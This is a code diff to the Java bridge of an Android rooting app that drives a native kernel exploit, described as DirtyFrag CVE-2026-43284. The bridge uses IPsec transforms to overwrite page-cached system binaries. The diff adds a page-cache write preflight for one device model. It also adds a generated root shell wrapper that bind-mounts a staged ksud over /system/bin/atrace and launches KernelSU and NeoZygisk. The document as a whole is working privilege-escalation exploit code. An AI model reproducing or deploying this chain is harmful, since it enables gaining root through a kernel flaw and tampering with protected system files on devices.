@@ -4,6 +4,7 @@ import android.content.Context;
 import android.net.IpSecAlgorithm;
 import android.net.IpSecManager;
 import android.net.IpSecTransform;
+import android.os.Build;
 
 import java.io.File;
 import java.io.FileOutputStream;
@@ -18,7 +19,8 @@ import java.security.SecureRandom;
  * "New method (fast)" engine — port of diabl0w/DFRoot (DirtyFrag CVE-2026-43284).
  * Public APIs only: IpSecManager allocates the socket + SPI + transform, the
  * native engine (libexp/libexpnext) patches the kernel page cache and ksud
- * is bind-mounted over logcat. No root, no Shizuku, no profile.
+ * is bind-mounted over logcat. No root, no Shizuku, no profile. A059 first
+ * runs a source-built, non-root page-cache read-back preflight.
  *
  * NOTE: this is the EXACT 4.4.7 engine (the version whose manual Root now
  * was proven working on-device). The caller loads the native lib itself.
@@ -26,6 +28,7 @@ import java.security.SecureRandom;
 public final class DFBridge {
 
     private static boolean loaded = false;
+    private static boolean diagnosticLoaded = false;
 
     private DFBridge() {}
 
@@ -36,21 +39,44 @@ public final class DFBridge {
         loaded = true;
     }
 
+    /** Loads the A059-only native preflight; the main engine remains prebuilt. */
+    private static synchronized void loadDiagnostic() {
+        if (diagnosticLoaded) return;
+        System.loadLibrary("expdiag");
+        diagnosticLoaded = true;
+    }
+
     public static native int nativeRunAll(IReporter reporter, int encapPort, int spi,
                                           byte[] aesCbcKey, byte[] hmacKey, int icvLen,
                                           int senderPort, boolean softReboot);
 
+    private static native int nativeProbeCrashDump(IReporter reporter, int encapPort, int spi,
+                                                    byte[] aesCbcKey, byte[] hmacKey, int icvLen,
+                                                    int senderPort);
+
+    private static native int nativeProbeScratchFile(IReporter reporter, int encapPort, int spi,
+                                                      byte[] aesCbcKey, byte[] hmacKey, int icvLen,
+                                                      int senderPort, String path, byte[] replacement);
+
     /** One full privileged-free root run. Returns the engine rc (0 = rooted). */
     public static int run(Context context, boolean next, boolean softReboot, IReporter reporter) {
+        IpSecManager.UdpEncapsulationSocket encapSock = null;
+        IpSecManager.SecurityParameterIndex spiObj = null;
+        IpSecTransform transform = null;
         try {
+            if (com.uniroot.app.BuildConfig.DIRTYFRAG_DIAGNOSTIC_ONLY &&
+                    !"A059".equals(Build.MODEL)) {
+                reporter.report("[diag] diagnostic-only build supports A059 only\n");
+                return 3;
+            }
             IpSecManager ipsec = (IpSecManager) context.getSystemService(Context.IPSEC_SERVICE);
 
-            IpSecManager.UdpEncapsulationSocket encapSock = ipsec.openUdpEncapsulationSocket();
+            encapSock = ipsec.openUdpEncapsulationSocket();
             int encapPort = encapSock.getPort();
             reporter.report("encap port: " + encapPort + "\n");
 
             InetAddress loopback = InetAddress.getByName("127.0.0.1");
-            IpSecManager.SecurityParameterIndex spiObj = ipsec.allocateSecurityParameterIndex(loopback);
+            spiObj = ipsec.allocateSecurityParameterIndex(loopback);
             int spiVal = spiObj.getSpi();
             reporter.report("spi: 0x" + Integer.toHexString(spiVal) + "\n");
 
@@ -65,26 +91,179 @@ public final class DFBridge {
             int senderPort = senderSock.getLocalPort();
             senderSock.close();
 
-            IpSecTransform transform = new IpSecTransform.Builder(context)
+            transform = new IpSecTransform.Builder(context)
                     .setEncryption(enc)
                     .setAuthentication(auth)
                     .setIpv4Encapsulation(encapSock, senderPort)
                     .buildTransportModeTransform(loopback, spiObj);
 
+            // On A059 the native engine currently reports that crash_dump64
+            // was patched, but the device then runs the original Android binary.
+            // Verify the page-cache bytes before touching the vendor target.
+            if (com.uniroot.app.BuildConfig.DIRTYFRAG_DIAGNOSTIC_ONLY &&
+                    "A059".equals(Build.MODEL)) {
+                try {
+                    loadDiagnostic();
+                } catch (Throwable t) {
+                    reporter.report("[diag] could not load A059 page-cache probe: " + t + "\n");
+                    return 3;
+                }
+                int scratch = runScratchProbe(context, reporter, encapPort, spiVal,
+                        aesKey, hmacKey, 128 / 8, senderPort);
+                reporter.report("[diag] app-owned scratch page-cache probe rc=" + scratch + "\n");
+                if (scratch != 0) {
+                    reporter.report("[diag] stopping: XFRM page-cache writes are not verified even " +
+                            "on an app-owned read-only file\n");
+                    return 3;
+                }
+                final int probe;
+                try {
+                    probe = nativeProbeCrashDump(reporter, encapPort, spiVal,
+                            aesKey, hmacKey, 128 / 8, senderPort);
+                } catch (Throwable t) {
+                    reporter.report("[diag] A059 page-cache probe failed: " + t + "\n");
+                    return 3;
+                }
+                if (probe != 0) {
+                    reporter.report("[diag] crash_dump64 page-cache write not confirmed; " +
+                            "stopping before vendor patch (rc=" + probe + ")\n");
+                    return 3;
+                }
+            }
+
+            if (com.uniroot.app.BuildConfig.DIRTYFRAG_DIAGNOSTIC_ONLY) {
+                reporter.report("[diag] preflight complete; root chain intentionally skipped\n");
+                return com.uniroot.app.newmethod.DfEngine.DIAGNOSTIC_ONLY_COMPLETE;
+            }
+
             stageKsud(context, next, reporter);
+            if ("OPD2415".equals(Build.MODEL)) {
+                stageOnePlusKsudCompatibilityWrapper(context, next, softReboot, reporter);
+            }
 
             // The Next ksud CLI rejects --soft-reboot: never pass it there.
             boolean sb = next ? false : softReboot;
             int rc = nativeRunAll(reporter, encapPort, spiVal, aesKey, hmacKey, 128 / 8, senderPort, sb);
-
-            transform.close();
-            spiObj.close();
-            encapSock.close();
             return rc;
         } catch (Exception e) {
             reporter.report("\nexception: " + e + "\n");
             return -1;
+        } finally {
+            closeQuietly(transform);
+            closeQuietly(spiObj);
+            closeQuietly(encapSock);
         }
+    }
+
+    private static int runScratchProbe(Context context, IReporter reporter, int encapPort, int spi,
+                                       byte[] aesKey, byte[] hmacKey, int icvLen, int senderPort) {
+        File probe = new File(context.getCacheDir(), "uniroot-dirtyfrag-pagecache-probe.bin");
+        try {
+            if (probe.exists()) {
+                probe.setWritable(true, false);
+                if (!probe.delete()) throw new IOException("cannot remove stale scratch probe");
+            }
+            byte[] original = new byte[64];
+            byte[] replacement = new byte[64];
+            for (int i = 0; i < original.length; i++) {
+                original[i] = (byte)(0x30 + i);
+                replacement[i] = (byte)(original[i] ^ 0x5a);
+            }
+            try (OutputStream out = new FileOutputStream(probe)) { out.write(original); }
+            if (!probe.setReadOnly()) throw new IOException("cannot mark scratch probe read-only");
+            return nativeProbeScratchFile(reporter, encapPort, spi, aesKey, hmacKey,
+                    icvLen, senderPort, probe.getAbsolutePath(), replacement);
+        } catch (Throwable t) {
+            reporter.report("[diag] scratch page-cache probe setup failed: " + t + "\n");
+            return -1;
+        } finally {
+            if (probe.exists()) {
+                probe.setWritable(true, false);
+                if (!probe.delete()) reporter.report("[diag] could not delete scratch probe file\n");
+            }
+        }
+    }
+
+    private static void closeQuietly(IpSecTransform value) {
+        if (value != null) try { value.close(); } catch (Throwable ignored) { }
+    }
+
+    private static void closeQuietly(IpSecManager.SecurityParameterIndex value) {
+        if (value != null) try { value.close(); } catch (Throwable ignored) { }
+    }
+
+    private static void closeQuietly(IpSecManager.UdpEncapsulationSocket value) {
+        if (value != null) try { value.close(); } catch (Throwable ignored) { }
+    }
+
+    /**
+     * UniRoot stages official KernelSU ksud, whose late-load CLI does not accept
+     * DFRoot's --ro-partitions/--soft-reboot flags. The native payload bind-mounts
+     * this file over logcat and passes those flags, so preserve the real binary
+     * separately and translate the invocation through a small root-time shim.
+     * When requested, the shim starts the enabled NeoZygisk module as root.
+     */
+    private static void stageOnePlusKsudCompatibilityWrapper(
+            Context context, boolean next, boolean autoNeoZygisk, IReporter reporter) throws IOException {
+        File root = context.getFilesDir().getParentFile();
+        if (root == null) throw new IOException("application data directory is unavailable");
+
+        File staged = new File(root, "ksud");
+        if (!staged.isFile()) throw new IOException("staged OnePlus ksud is missing");
+
+        File real = new File(root, "ksud-real");
+        copyFile(staged, real);
+        String manager = next ? "com.rifsxd.ksunext" : "me.weishu.kernelsu";
+        String script = "#!/system/bin/sh\n" +
+                "REAL='" + real.getAbsolutePath() + "'\n" +
+                "STAGE='/data/local/tmp/uniroot-ksud-stage'\n" +
+                "LOG='/data/local/tmp/uniroot-ksud-late-load.log'\n" +
+                "if [ ! -x \"$REAL\" ]; then echo 'ksud-real missing' >\"$LOG\"; " +
+                "/system/bin/chmod 0644 \"$LOG\"; exit 127; fi\n" +
+                "echo 'args: late-load --kmi android15-6.6 --package-name " + manager + "' >\"$LOG\"\n" +
+                "echo \"wrapper_uid=$(/system/bin/id -u)\" >>\"$LOG\"\n" +
+                "/system/bin/cp -f \"$REAL\" \"$STAGE\" >>\"$LOG\" 2>&1 || exit 126\n" +
+                "/system/bin/chmod 755 \"$STAGE\" >>\"$LOG\" 2>&1 || exit 126\n" +
+                "/system/bin/mount -o bind \"$STAGE\" /system/bin/atrace >>\"$LOG\" 2>&1 || exit 126\n" +
+                "/system/bin/atrace late-load --kmi android15-6.6 --package-name " + manager + " >>\"$LOG\" 2>&1\n" +
+                "rc=$?\n" +
+                "echo \"ksud_rc=$rc\" >>\"$LOG\"\n";
+        if (autoNeoZygisk && !next) {
+            script += "if [ \"$rc\" -eq 0 ] && [ -f /data/adb/modules/zygisksu/post-fs-data.sh ] " +
+                    "&& [ ! -e /data/adb/modules/zygisksu/disable ]; then\n" +
+                    "  echo 'NeoZygisk startup queued (10s delay)' >>\"$LOG\"\n" +
+                    "  (\n" +
+                    "    /system/bin/sleep 10\n" +
+                    "    echo 'NeoZygisk post-fs-data starting' >>\"$LOG\"\n" +
+                    "    /system/bin/sh /data/adb/modules/zygisksu/post-fs-data.sh >>\"$LOG\" 2>&1\n" +
+                    "    neo_rc=$?\n" +
+                    "    echo \"neozygisk_rc=$neo_rc\" >>\"$LOG\"\n" +
+                    "    if [ \"$neo_rc\" -eq 0 ]; then\n" +
+                    "      echo 'NeoZygisk is running; soft-reboot remains manual' >>\"$LOG\"\n" +
+                    "    fi\n" +
+                    "    /system/bin/chmod 0644 \"$LOG\" 2>/dev/null\n" +
+                    "  ) </dev/null >>\"$LOG\" 2>&1 &\n" +
+                    "  echo 'NeoZygisk auto-start scheduled; no soft-reboot will be issued' >>\"$LOG\"\n" +
+                    "elif [ \"$rc\" -eq 0 ]; then\n" +
+                    "  echo 'NeoZygisk missing or disabled; activation skipped' >>\"$LOG\"\n" +
+                    "fi\n";
+            reporter.report("[ksud] Enabled NeoZygisk will be started after late-load; soft-reboot remains manual; " +
+                    "details -> /data/local/tmp/uniroot-ksud-late-load.log\n");
+        }
+        script += "/system/bin/chmod 0644 \"$LOG\" 2>/dev/null\n" + "exit \"$rc\"\n";
+
+        File tmp = new File(root, "ksud-wrapper.tmp");
+        try (OutputStream out = new FileOutputStream(tmp)) {
+            out.write(script.getBytes(java.nio.charset.StandardCharsets.UTF_8));
+        }
+        if (!tmp.renameTo(staged)) {
+            tmp.delete();
+            throw new IOException("could not stage OnePlus ksud compatibility wrapper");
+        }
+        staged.setReadable(true, false);
+        staged.setExecutable(true, false);
+        reporter.report("[ksud] OnePlus wrapper strips unsupported --ro-partitions/--soft-reboot; " +
+                "command output -> /data/local/tmp/uniroot-ksud-late-load.log\n");
     }
 
     /** Stages the flavor's ksud (user-patched custom first, then bundled). */
